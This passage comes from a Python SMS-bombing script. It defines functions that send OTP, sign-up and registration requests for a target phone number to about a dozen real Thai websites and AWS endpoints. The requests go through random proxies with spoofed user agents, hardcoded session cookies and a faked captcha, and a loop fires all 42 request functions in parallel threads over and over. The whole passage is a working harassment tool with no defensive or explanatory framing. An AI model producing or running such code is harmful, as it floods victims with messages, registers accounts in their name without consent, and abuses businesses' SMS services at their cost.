			SMS = SEND.post("https://www.bigthailand.com/authentication-service/user/OTP",headers={"user-agent": generate_user_agent(),"authorization": f"Bearer {TOKEN}['value']","content-type": "application/json;charset=UTF-8","cookie": f"""auth.strategy=local; auth._token.local=Bearer%20{TOKEN}['value]; _pk_ref.564990563.2c0e=%5B%22google%22%2C%22%22%2C1664004463%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990563.2c0e=*; _gcl_au=1.1.1986299425.1664004463; _cdp_cfg=1; _asm_visitor_type=n; _ac_au_gt=1664004464356; _gid=GA1.2.681823710.1664004464; _gat_UA-165856282-1=1; popupTimeStamp=%7B%22popupIdx%22%3A0%2C%22expiredAt%22%3A%222022-09-24T07%3A57%3A43.685Z%22%7D; _asm_uid=890390276; cdp_session=1; _fbp=fb.1.1664004464406.202179650; _ga=GA1.2.2004890464.1664004464; _gac_UA-165856282-1=1.1664004466.Cj0KCQjw1bqZBhDXARIsANTjCPJYsw6vOZXFPznA9K3T9a7DJPSigqMeogNJR_toRTt9mJVPQifKu9IaAuM3EALw_wcB; isiframeenabled=true; _tt_enable_cookie=1; _ttp=fb53a55e-7e89-482c-8dcc-7d65cc3a9d43; _gcl_aw=GCL.1664004467.Cj0KCQjw1bqZBhDXARIsANTjCPJYsw6vOZXFPznA9K3T9a7DJPSigqMeogNJR_toRTt9mJVPQifKu9IaAuM3EALw_wcB; bigthailand-_zldp=OM%2F3Rx7iTnXlJ%2BG06WL7xCVOFTKwr0NmKdBzRqdYXCGLMGKJRuNpNfzZ9I3mvVMsodoRkLyJC2Y%3D; bigthailand-_zldt=93ed1974-6077-46c9-80b4-5d8af7b21d11-2; _ga_80VN88PBVD=GS1.1.1664004463.1.1.1664004470.53.0.0; _pk_id.564990563.2c0e=0.1664004463.1.1664004484.1664004463.; _ac_client_id=890389481.1664004485; _ac_an_session=zmzmzmzjzmzgzmzmzizjzdzrzqzjzgzrzqznzrzizdzizlzlznzjzjznznzrzmzdzizdzizlzlznzjzjznznzrzmzdzizlzlznzjzjznznzrzmzdzizdzgzjzizdzjzd2h25zdzgzdznzkzmzqzrzd; au_id=890389481; OptanonAlertBoxClosed=2022-09-24T07:28:08.466Z; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Sep+24+2022+14%3A28%3A08+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.33.0&isIABGlobal=false&hosts=&consentId=47109f59-44b2-40f3-b0c9-4e0b0c8cd8a9&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1%2CC0007%3A1"""},json={"locale":"th","phone":f"+66{phone[1:]}","email":"asjfgyfg2@hbsfsdf.sdf","userParams":{"buyerName":"sfiushjud fusdhfus","activateLink":"www.google.com"}},proxies={'http': 'http://' + random.choice(s)})
		def api32():
			SMS = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]},proxies={'http': 'http://' + random.choice(s)})
			SMS = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api33():
			SMS = requests.post("https://gettgo.com/sessions/otp_for_sign_in",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "ahoy_visitor=30a07617-c45f-42f8-91a5-6b418e039150; ahoy_visit=c29a79cf-5c80-43cb-aa66-41df50851d0b; _gettgo_web_session=e18fe858f9de3ffd7b62eba57a20fb82; _gid=GA1.2.636671089.1664011013; _dc_gtm_UA-100399003-1=1; _fbp=fb.1.1664011013352.897165226; _gcl_au=1.1.1962297294.1664011020; _ga_JPR45GD1D3=GS1.1.1664011013.1.1.1664011020.53.0.0; _ga=GA1.1.765807485.1664011013","user-agent": generate_user_agent(),"x-requested-with": "XMLHttpRequest"},data=f"mobile_number={phone}")
			print(f"\x1b[92m{SMS}")
		def api34():
			SMS = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api35():
			SMS = requests.post("https://www.msport1688.com/auth/otp_sender",headers={"content-type": "application/x-www-form-urlencoded","cookie": "msp_ss_client=nin5curi8elq4364dlslffs5ennnv8oo; _ga=GA1.1.867791689.1664019874; _ga_1YLLB0C2FF=GS1.1.1664019873.1.1.1664019875.0.0.0","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api36():
			SMS = requests.post("https://api.1112delivery.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": generate_user_agent(),"accept": "application/json, text/plain, */*"},json={"phonenumber":phone,"language":"th"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api37():
			SMS = requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D; _gcl_au=1.1.1744992984.1664699333; _ga_5H8RG35JM3=GS1.1.1664699330.1.1.1664699332.0.0.0; _gid=GA1.2.1851918371.1664699333; _gat_UA-208577766-1=1; _ga=GA1.1.1543229521.1664699330; _ga_9QF6J7SNMX=GS1.1.1664699332.1.0.1664699332.0.0.0"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api38():
			SMS = requests.post("https://chobrod.com/register",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","x-requested-with": "XMLHttpRequest","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","cookie": ".AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8AbF96Heci1NnsIpfhXCcZq_1dcnjr3wJH7IbyuvXx7JO98q0olmE5QQ09sRX3ts4f0snXBgp8hKG68ehlSJxRKG2BLY2Wj9z-AV6rmiU8RDNlEhHozm-R_ZGKSEbQSycbX455ffFuyBSw7fAUE-9M8; CHOBROD_SERVERID=051_30886; referrerCheckingGA=https://www.google.com/; _ga=GA1.2.684081299.1664700698; _gid=GA1.2.1610639645.1664700698; _gat_UA-88971742-1=1; sidchobrod=m08SOd7CyVuruAdw6iJ6fiZ9Sdm1V90G; usidchobrod=EENsATLoK7OnvSeYvnOuhOEJfl2zllCK; G_ENABLED_IDPS=google; _fbp=fb.1.1664700699743.423276722; GuildId=615af95c-99ca-48ba-bf8c-39a6638a708e; _ga_D11BPJ59QV=GS1.1.1664700697.1.1.1664700735.0.0.0"},data=f"ReturnUrl=%2F&UserName={phone}&Displayname=asssdad+sadass&CityId=1&&Captcha=F9UR",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api39():
			r = requests.get(f"https://4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com/dev/request-otp/+66{phone[1:]}",headers={"authority": "4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"})
			print(f"\x1b[92m{r}")
		def api40():
			r = requests.post("https://api.fairdee.co.th/profile/request-otp",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "mp_184c9deb723214f5772e9320157cb5b9_mixpanel=%7B%22distinct_id%22%3A%20%22183bbb5007ddf-0261f79d6d1bad-5771031-1fa400-183bbb5007e6f9%22%2C%22%24device_id%22%3A%20%22183bbb5007ddf-0261f79d6d1bad-5771031-1fa400-183bbb5007e6f9%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; WZRK_G=a566c075343f4d118e2b0f35111f6f22; WZRK_S_69W-676-R46Z=%7B%22p%22%3A1%2C%22s%22%3A1665301546%2C%22t%22%3A1665301545%7D; _ga=GA1.3.837932271.1665301552; _gid=GA1.3.1240970639.1665301552; _gat=1; _gcl_au=1.1.1486581940.1665301553; _gat_gtag_UA_116460668_3=1; ajs_anonymous_id=578a9b90-fec5-409e-9b9e-60461e79d2a8; _fbp=fb.2.1665301553007.478015998","accept": "application/json, text/plain, */*"},json={"username":phone,"username_type":"phone","intent":"signup","is_email_otp":'false'},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api41():
			r = requests.post("https://admin-api.24fix.tech/auth/otp/request",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},json={"phoneNumber":phone},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api42():
			r = requests.post("https://www.ctrueshop.com/member.php?page=25&type=9",headers={"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","content-type": "application/x-www-form-urlencoded","cookie": "PHPSESSID=1po9v1nrrem5fr8co6urk37lv1; _gcl_au=1.1.867007754.1665302231; _ga=GA1.2.1978432786.1665302231; _gid=GA1.2.1842911343.1665302231; _gat_gtag_UA_19183081_1=1; __sdwc=0978bae8-1717-4f1b-9f1a-dcf9dce81fa8; rchatbox:checkCrossOriginWebdata=1665302236917","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},data=f"tel1={phone}&affiliate=2&social=",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")

		for i in range(jam):
			threading.Thread(target=api1).start()
			threading.Thread(target=api2).start()
			threading.Thread(target=api3).start()
			threading.Thread(target=api4).start()
			threading.Thread(target=api5).start()
			threading.Thread(target=api6).start()
			threading.Thread(target=api7).start()
			threading.Thread(target=api8).start()
			threading.Thread(target=api9).start()
			threading.Thread(target=api10).start()
			threading.Thread(target=api11).start()
			threading.Thread(target=api12).start()
			threading.Thread(target=api13).start()
			threading.Thread(target=api14).start()
			threading.Thread(target=api15).start()
			threading.Thread(target=api16).start()
			threading.Thread(target=api17).start()
			threading.Thread(target=api18).start()
			threading.Thread(target=api19).start()
			threading.Thread(target=api20).start()
			threading.Thread(target=api21).start()
			threading.Thread(target=api22).start()
			threading.Thread(target=api23).start()
			threading.Thread(target=api24).start()
			threading.Thread(target=api25).start()
			threading.Thread(target=api26).start()
			threading.Thread(target=api27).start()
			threading.Thread(target=api28).start()
			threading.Thread(target=api29).start()
			threading.Thread(target=api30).start()
			threading.Thread(target=api31).start()
			threading.Thread(target=api32).start()
			threading.Thread(target=api33).start()
			threading.Thread(target=api34).start()
			threading.Thread(target=api35).start()
			threading.Thread(target=api36).start()
			threading.Thread(target=api37).start()
			threading.Thread(target=api38).start()
			threading.Thread(target=api39).start()
			threading.Thread(target=api40).start()
			threading.Thread(target=api41).start()
			threading.Thread(target=api42).start()
  
if __name__ == '__main__':
	asyncio.run(home())